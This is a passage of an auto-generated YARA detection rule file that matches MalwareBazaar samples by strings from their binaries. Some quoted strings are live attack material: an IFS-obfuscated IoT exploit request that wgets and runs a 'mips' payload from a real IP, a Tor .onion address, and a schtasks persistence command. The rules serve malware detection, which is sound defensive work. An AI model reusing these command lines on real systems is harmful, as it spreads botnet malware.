        $s10 = "OpenPrinterA"
        $s11 = "WritePrinter"
        $s12 = "user32"
        $s13 = "SetCursor"
        $s14 = "LoadCursorA"
        $s15 = "Kernel32"
        $s16 = "WritePrivateProfileStringA"
        $s17 = "GetPrivateProfileStringA"
        $s18 = "kernel32.dll"
        $s19 = "shell32.dll"
        $s20 = "ShellAboutA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 100KB and
        all of them
}

rule Windows_f2965385482045f065caf8a7b212880266f6bd6b360c8248559eb3a12217e27d
{
    meta:
        description = "Auto ML: f2965385482045f065caf8a7b212880266f6bd6b360c8248559eb3a12217e27d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "``.data"
        $s3 = ".rdata"
        $s4 = ".rsrc"
        $s5 = ".reloc"
        $s6 = "SystemFuH"
        $s7 = "RtlGetCuH"
        $s8 = "tlGetCurH"
        $s9 = "RtlGetNtH"
        $s10 = "WSAGetOvH"
        $s11 = "wine_getH"
        $s12 = "GetSysteH"
        $s13 = "time.DatH"
        $s14 = ";fileu"
        $s15 = "?fileumH"
        $s16 = ":windu"
        $s17 = "8windu fA"
        $s18 = "8open"
        $s19 = "9fileu"
        $s20 = ">fileuF"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3098KB and
        all of them
}

rule Windows_f2ac390b52f206b054befdf6b04f717b98df64eeb74c83629a75a93f09b1a6c7
{
    meta:
        description = "Auto ML: f2ac390b52f206b054befdf6b04f717b98df64eeb74c83629a75a93f09b1a6c7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "api-ms-win-crt-string-l1-1-0.dll"
        $s6 = "too many files"
        $s7 = "invalid filename"
        $s8 = "file too large"
        $s9 = "file not found"
        $s10 = "file stat failed"
        $s11 = "file open failed"
        $s12 = "file seek failed"
        $s13 = "write callback failed"
        $s14 = "file write failed"
        $s15 = "file create failed"
        $s16 = "file close failed"
        $s17 = "file read failed"
        $s18 = "Windows Vista"
        $s19 = "Windows Server 2008"
        $s20 = "Windows 8"
    condition:
        uint32(0) == 0x00785a4d and
        filesize < 573KB and
        all of them
}

rule Windows_f2b63f92ce68836d5f33b8136c8dae7344944a099884e2aad0726e5abdd3f881
{
    meta:
        description = "Auto ML: f2b63f92ce68836d5f33b8136c8dae7344944a099884e2aad0726e5abdd3f881"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Microsoft.Win32"
        $s5 = "<Module>"
        $s6 = "get_FormatID"
        $s7 = "get_ASCII"
        $s8 = "System.IO"
        $s9 = "System.Collections.Generic"
        $s10 = "get_SendSync"
        $s11 = "EndRead"
        $s12 = "BeginRead"
        $s13 = "Thread"
        $s14 = "Load"
        $s15 = "get_Connected"
        $s16 = "get_IsConnected"
        $s17 = "set_IsConnected"
        $s18 = "get_Guid"
        $s19 = "<IsConnected>k__BackingField"
        $s20 = "<Offset>k__BackingField"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 48KB and
        all of them
}

rule Linux_f2ccf0f52d1d66e1674f8096c1816968b7f3d7711af4735ab2311d7edccecb4f
{
    meta:
        description = "Auto ML: f2ccf0f52d1d66e1674f8096c1816968b7f3d7711af4735ab2311d7edccecb4f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "wget-log"
        $s2 = "1337SoraLOADER"
        $s3 = "nloads"
        $s4 = "elfLoad"
        $s5 = ".text"
        $s6 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 51KB and
        all of them
}

rule Linux_f2d7e8e62d588aca7b1bf07510ccfa21ed6b19cb043107316e9735888b167739
{
    meta:
        description = "Auto ML: f2d7e8e62d588aca7b1bf07510ccfa21ed6b19cb043107316e9735888b167739"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 194KB and
        all of them
}

rule Windows_f2f4a080f5b2c9d0ab62fe32580a31eba7941e17185223bf28ad18840a8ae5a2
{
    meta:
        description = "Auto ML: f2f4a080f5b2c9d0ab62fe32580a31eba7941e17185223bf28ad18840a8ae5a2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "- unable to open console device"
        $s6 = "- unexpected multithread lock error"
        $s7 = "- not enough space for thread data"
        $s8 = "- floating point not loaded"
        $s9 = "GetLastActivePopup"
        $s10 = "GetActiveWindow"
        $s11 = "user32.dll"
        $s12 = "DeleteFileA"
        $s13 = "CloseHandle"
        $s14 = "CreateFileA"
        $s15 = "SetFilePointer"
        $s16 = "ReadFile"
        $s17 = "WriteFile"
        $s18 = "GetLastError"
        $s19 = "GetUserDefaultLangID"
        $s20 = "SetThreadPriority"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1299KB and
        all of them
}

rule Linux_f350d6c434afc2acfae38863a5581d94fd45620a045e8a9dca056545977d3925
{
    meta:
        description = "Auto ML: f350d6c434afc2acfae38863a5581d94fd45620a045e8a9dca056545977d3925"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "http://"
        $s2 = "https://"
        $s3 = "/ (deleted)"
        $s4 = "/lib/systemd/"
        $s5 = "/system/system/bin/"
        $s6 = "/data/module/jdk"
        $s7 = "No such file or directory"
        $s8 = "No such process"
        $s9 = "Interrupted system call"
        $s10 = "Bad file descriptor"
        $s11 = "No child processes"
        $s12 = "Resource temporarily unavailable"
        $s13 = "File exists"
        $s14 = "Too many open files in system"
        $s15 = "Too many open files"
        $s16 = "Text file busy"
        $s17 = "File too large"
        $s18 = "Read-only file system"
        $s19 = "File name too long"
        $s20 = "Level 3 reset"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 103KB and
        all of them
}

rule Windows_f38327b8c73b8f9b205f8ac447f83c7a6b425908283bb68bf742827248dd4f32
{
    meta:
        description = "Auto ML: f38327b8c73b8f9b205f8ac447f83c7a6b425908283bb68bf742827248dd4f32"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = ".data"
        $s4 = "delete"
        $s5 = "delete[]"
        $s6 = "`placement delete closure'"
        $s7 = "`placement delete[] closure'"
        $s8 = "`local static thread guard'"
        $s9 = "FlsGetValue"
        $s10 = "FlsSetValue"
        $s11 = "CorExitProcess"
        $s12 = "AreFileApisANSI"
        $s13 = "AppPolicyGetProcessTerminationMethod"
        $s14 = "http://kzeaqky6axif3jukzx7jj7ylhfgtytpb3xeojsfigogriyv6bv3cimyd.onion/index.php"
        $s15 = "http://"
        $s16 = "HTTP/1.1"
        $s17 = "User-Agent:"
        $s18 = "Connection: keep-alive"
        $s19 = "schtasks /create /sc minute /ED \"11/02/2024\" /mo 7 /tn \"Timer\" /tr c:\\windows\\system\\svchost.exe /ru SYSTEM"
        $s20 = "c:\\windows\\system\\svchost.exe"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5389KB and
        all of them
}

rule Windows_1742b48fad9814441ee7726009a0e375757134dcc872f88ed584b6a2099c7473
{
    meta:
        description = "Auto ML: 1742b48fad9814441ee7726009a0e375757134dcc872f88ed584b6a2099c7473"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Read>b__0"
        $s5 = "<Read>b__2_1"
        $s6 = "Microsoft.Win32"
        $s7 = "user32"
        $s8 = "ReadInt32"
        $s9 = "WriteUInt64"
        $s10 = "GetAsUInt64"
        $s11 = "SetAsUInt64"
        $s12 = "<Module>"
        $s13 = "SystemParametersInfoA"
        $s14 = "ES_SYSTEM_REQUIRED"
        $s15 = "get_FormatID"
        $s16 = "get_ASCII"
        $s17 = "System.IO"
        $s18 = "ReadServertData"
        $s19 = "System.Collections.Generic"
        $s20 = "get_SendSync"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 63KB and
        all of them
}

rule Windows_f3bf0bc6ae0dc1d8bd4c24f0d2b581145d9d5395d173dbccc724eb5d0d1de956
{
    meta:
        description = "Auto ML: f3bf0bc6ae0dc1d8bd4c24f0d2b581145d9d5395d173dbccc724eb5d0d1de956"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "kernel32.dll"
        $s6 = "user32.dll"
        $s7 = "User32.dll"
        $s8 = "gdiplus.dll"
        $s9 = "GdiPlus.dll"
        $s10 = "Kernel32.dll"
        $s11 = "kernel32"
        $s12 = "user32"
        $s13 = "in4mation.dll"
        $s14 = "ntdll.dll"
        $s15 = "DLL_HealthBar.dll"
        $s16 = "DLL_WardSkin.dll"
        $s17 = "DLL_Skills.dll"
        $s18 = "DLL_Cursor.dll"
        $s19 = "wininet.dll"
        $s20 = "msimg32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 14636KB and
        all of them
}

rule Linux_f4044964a9c0bf74603e94f09230a9643a785fc623c60b823197f6878bcc99e7
{
    meta:
        description = "Auto ML: f4044964a9c0bf74603e94f09230a9643a785fc623c60b823197f6878bcc99e7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%s/cmdline"
        $s9 = "/bin/systemd"
        $s10 = "/var/Challenget"
        $s11 = "[killer] Failed to create child process."
        $s12 = "deleted"
        $s13 = "payloadasdf"
        $s14 = "GET /%s HTTP/1.0"
        $s15 = "User-Agent: Update v1.0"
        $s16 = "GET /bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http://103.110.33.164/mips;${IFS}chmod${IFS}777${IFS}mips;${IFS}./mips${IFS}zyxel.selfrep;"
        $s17 = "No such file or directory"
        $s18 = "No such process"
        $s19 = "Interrupted system call"
        $s20 = "Bad file descriptor"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 147KB and
        all of them
}

rule Linux_f40d25d149bb970c7cff3fec7dfde5f2d5a0dce52cd2fb339de144160e68e705
{
    meta:
        description = "Auto ML: f40d25d149bb970c7cff3fec7dfde5f2d5a0dce52cd2fb339de144160e68e705"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 53KB and
        all of them
}

rule Windows_f4273f9df8bca6ecf2fad75248105d1ac87cf4bb01dd69c50511b62199f71988
{
    meta:
        description = "Auto ML: f4273f9df8bca6ecf2fad75248105d1ac87cf4bb01dd69c50511b62199f71988"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2440KB and
        all of them
}

rule Windows_f47ae4e664869d909874896cdc389a1a808054a9cd8bd495fe77d608bd01065a
{
    meta:
        description = "Auto ML: f47ae4e664869d909874896cdc389a1a808054a9cd8bd495fe77d608bd01065a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4603KB and
        all of them
}

rule Windows_f47c028b576f0510c5a5ecee522789eccef66ac59d3d60e7b4c91ef0841e9730
{
    meta:
        description = "Auto ML: f47c028b576f0510c5a5ecee522789eccef66ac59d3d60e7b4c91ef0841e9730"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1152KB and
        all of them
}

rule Windows_f49a368529fcc6e6e9f1bc66b6254bda180d5d80189859d10116c9e5719eba1c
{
    meta:
        description = "Auto ML: f49a368529fcc6e6e9f1bc66b6254bda180d5d80189859d10116c9e5719eba1c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "New order.exe"
        $s4 = "<Module>"
        $s5 = "TouchSocket.Database"
        $s6 = "System"
        $s7 = "TouchSocket.Composer"
        $s8 = "TemplateIndexerAttribute"
        $s9 = "TouchSocket.Attributes"
        $s10 = "IsReadOnlyAttribute"
        $s11 = "System.Runtime.CompilerServices"
        $s12 = "Registry`1"
        $s13 = "CustomerRegistryExpression`1"
        $s14 = "TouchSocket.Expressions"
        $s15 = "ParameterProcessorWatcher`1"
        $s16 = "TouchSocket.Queues"
        $s17 = "TouchSocket.Exceptions"
        $s18 = "Processor"
        $s19 = "TouchSocket.Common"
        $s20 = "Process"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2788KB and
        all of them
}

rule Windows_f49df8365499aecefe4017e54f3c706cc2da4e0e90e59431c3d531253cf479c6
{
    meta:
        description = "Auto ML: f49df8365499aecefe4017e54f3c706cc2da4e0e90e59431c3d531253cf479c6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "KERNEL32.DLL"
        $s3 = "COMCTL32.dll"
        $s4 = "MSIMG32.dll"
        $s5 = "MSVCRT.dll"
        $s6 = "MSVFW32.dll"
        $s7 = "USER32.dll"
        $s8 = "LoadLibraryA"
        $s9 = "GetProcAddress"
        $s10 = "DrawDibOpen"
        $s11 = "GetDC"
        $s12 = "SkinH_EL.dll"
        $s13 = "SkinH_GetColor"
        $s14 = "SkinH_SetAero"
        $s15 = "SkinH_SetBackColor"
        $s16 = "SkinH_SetFont"
        $s17 = "SkinH_SetFontEx"
        $s18 = "SkinH_SetForeColor"
        $s19 = "SkinH_SetMenuAlpha"
        $s20 = "SkinH_SetTitleMenuBar"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 273KB and
        all of them
}

rule Windows_f4c455771c51a4cc207b7d4712e405a0d6474029541d2dbab07dc11f2bb39921
{
    meta:
        description = "Auto ML: f4c455771c51a4cc207b7d4712e405a0d6474029541d2dbab07dc11f2bb39921"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "TEMP"
        $s7 = "USERPROFILE"
        $s8 = "GetUserDefaultUILanguage"
        $s9 = "kernel32.dll"
        $s10 = "TFile"
        $s11 = "EFileError"
        $s12 = "File I/O error %d"
        $s13 = "TCompressedBlockReader"
        $s14 = "TSetupLanguageEntry@"
        $s15 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s16 = "shell32.dll"
        $s17 = "InnoSetupLdrWindow"
        $s18 = "Inno Setup Setup Data (5.1.2)"
        $s19 = "Inno Setup Messages (5.1.0)"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4764KB and
        all of them
}

rule Windows_f4c51f676fbf02b54592aeffda6f0b342db00d7170f479a7cf0ba40420153322
{
    meta:
        description = "Auto ML: f4c51f676fbf02b54592aeffda6f0b342db00d7170f479a7cf0ba40420153322"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "System.ComponentModel"
        $s7 = "System.CodeDom.Compiler"
        $s8 = "System.Diagnostics"
        $s9 = "DebuggerNonUserCodeAttribute"
        $s10 = "System"
        $s11 = "Microsoft.VisualBasic.CompilerServices"
        $s12 = "StandardModuleAttribute"
        $s13 = "HideModuleNameAttribute"
        $s14 = "GetObjectValue"
        $s15 = "GetHashCode"
        $s16 = "GetTypeFromHandle"
        $s17 = "CreateInstance"
        $s18 = "System.Runtime.InteropServices"
        $s19 = "ThreadStaticAttribute"
        $s20 = "m_ThreadStaticValue"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 301KB and
        all of them
}

rule Windows_1749c2de6125b6a38e42dd557b64b2d07abec025eb50f23743394136f655cf35
{
    meta:
        description = "Auto ML: 1749c2de6125b6a38e42dd557b64b2d07abec025eb50f23743394136f655cf35"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 203KB and
        all of them
}

rule Windows_f4c981438a224d6e37c984b07556a444c6f8677d76e566a1b54db33847f559c9
{
    meta:
        description = "Auto ML: f4c981438a224d6e37c984b07556a444c6f8677d76e566a1b54db33847f559c9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = ">WinW`"
        $s6 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aBj"
        $s7 = "QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
        $s8 = "System.Drawing.Icon"
        $s9 = "System.Drawing.Size"
        $s10 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADw"
        $s11 = "System.Drawing.Bitmap"
        $s12 = "geTp"
        $s13 = "sETT"
        $s14 = "wINH"
        $s15 = "GETz"
        $s16 = "cgET"
        $s17 = "SETz3"
        $s18 = "GETL"
        $s19 = "SolarSystemID"
        $s20 = "BaseTE"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 17040KB and
        all of them
}

rule Windows_f4ce9768f48453eafcacc6856ab813d9693760e91da762e4597922a836ffce78
{
    meta:
        description = "Auto ML: f4ce9768f48453eafcacc6856ab813d9693760e91da762e4597922a836ffce78"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2544KB and
        all of them
}

rule Windows_f520eb5804ae1b26974fabee5403470f1aa97b837fdd9856b3a5f252199a07f4
{
    meta:
        description = "Auto ML: f520eb5804ae1b26974fabee5403470f1aa97b837fdd9856b3a5f252199a07f4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.rsrc"
        $s4 = "cmdh4"
        $s5 = "-nFWin"
        $s6 = "ZSET"
        $s7 = "y&Q0CmdA{"
        $s8 = "bWin"
        $s9 = "cMDa"
        $s10 = "CMdZ"
        $s11 = "]GeTu"
        $s12 = "CmDb"
        $s13 = "WiNc',"
        $s14 = "GSET$"
        $s15 = "getp"
        $s16 = "SETj"
        $s17 = "gEtPA"
        $s18 = "rSETl"
        $s19 = "vSeT"
        $s20 = "{sEtrH\"0r"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 30728KB and
        all of them
}

rule Windows_f554eee597d0262cd192e15ecfb61c71746ca2c0bc9948dc7703440e797f802e
{
    meta:
        description = "Auto ML: f554eee597d0262cd192e15ecfb61c71746ca2c0bc9948dc7703440e797f802e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "temp1"
        $s5 = "temp2"
        $s6 = "<Module>"
        $s7 = "get_esqaY"
        $s8 = "Thread"
        $s9 = "add_Load"
        $s10 = "Image_Load"
        $s11 = "MChess_Load"
        $s12 = "set_Checked"
        $s13 = "set_Enabled"
        $s14 = "GetInstance"
        $s15 = "set_AutoScaleMode"
        $s16 = "get_Image"
        $s17 = "set_Image"
        $s18 = "GetTypeFromHandle"
        $s19 = "set_BorderStyle"
        $s20 = "set_Name"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 686KB and
        all of them
}

rule Linux_f5560f06287915911aced83dada5851fd48752b3ecb4cd9e1331970a09b45bf8
{
    meta:
        description = "Auto ML: f5560f06287915911aced83dada5851fd48752b3ecb4cd9e1331970a09b45bf8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".data.rel.ro"
        $s3 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 75KB and
        all of them
}

rule Windows_f5583f23e429e7587b8ea4a367564b50be79e598c46c0545fe5a5b32dc58d6d0
{
    meta:
        description = "Auto ML: f5583f23e429e7587b8ea4a367564b50be79e598c46c0545fe5a5b32dc58d6d0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = ".data"
        $s3 = "Lhttp://pki-crl.symauth.com/ca_732b6ec148d290c0a071efd1dac8e288/LatestCRL.crl07"
        $s4 = "http://pki-ocsp.symauth.com0"
        $s5 = "ehttp://pki-crl.symauth.com/offlineca/TheInstituteofElectricalandElectronicsEngineersIncIEEERootCA.crl0"
        $s6 = "kernel32.dll"
        $s7 = "user32.dll"
        $s8 = "advapi32.dll"
        $s9 = "oleaut32.dll"
        $s10 = "shell32.dll"
        $s11 = "version.dll"
        $s12 = "mscoree.dll"
        $s13 = "GetModuleHandleA"
        $s14 = "GetProcAddress"
        $s15 = "ExitProcess"
        $s16 = "LoadLibraryA"
        $s17 = "RegCloseKey"
        $s18 = "CreateFontA"
        $s19 = "ShellExecuteA"
        $s20 = "GetFileVersionInfoA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5830KB and
        all of them
}

rule Windows_f58e57d1015834305e61c7f021794c682ee9174bb3ad6eb189620811fea975a8
{
    meta:
        description = "Auto ML: f58e57d1015834305e61c7f021794c682ee9174bb3ad6eb189620811fea975a8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
    condition:
        uint32(0) == 0x00805a4d and
        filesize < 33KB and
        all of them
}

rule Linux_f5caeea5742112353d290b4bc5c2b8041f52f9d37bbfc45e03fa9373e6595350
{
    meta:
        description = "Auto ML: f5caeea5742112353d290b4bc5c2b8041f52f9d37bbfc45e03fa9373e6595350"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "bin/systemd"
        $s7 = "/bin/systemd"
        $s8 = "GET /%s HTTP/1.0"
        $s9 = "User-Agent: Update v1.0"
        $s10 = "No such file or directory"
        $s11 = "No such process"
        $s12 = "Interrupted system call"
        $s13 = "Bad file descriptor"
        $s14 = "No child processes"
        $s15 = "Resource temporarily unavailable"
        $s16 = "File exists"
        $s17 = "Too many open files in system"
        $s18 = "Too many open files"
        $s19 = "Text file busy"
        $s20 = "File too large"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 165KB and
        all of them
}

rule Windows_f5e6a0b0c3587f36c025c2bb94929f8b7273f25c5ebdc6755f6a582b01cb8caa
{
    meta:
